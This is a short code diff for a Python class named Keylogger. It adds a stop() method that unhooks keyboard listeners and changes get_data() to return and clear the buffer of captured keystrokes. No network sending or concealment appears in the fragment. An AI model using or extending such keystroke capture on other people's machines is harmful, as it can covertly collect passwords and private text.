@@ -44,18 +44,19 @@ class Keylogger:
         """
         keyboard.hook(self._on_key_event)
 
-
-    def start(self) -> None:
+    def stop(self) -> None:
         """
-        start listening to keyboard events.
+        stop listening to keyboard events.
         """
-        keyboard.hook(self._on_key_event)
+        keyboard.unhook_all()
 
     def get_data(self) -> List[str]:
         """
-        get the data that has been collected.
+        get the data that has been collected and reset the buffer.
         """
-        return self.buffer
+        data = self.buffer.copy()
+        self.buffer.clear()  # איפוס ה-buffer
+        return data
 
     def _on_key_event(self, event):
         """
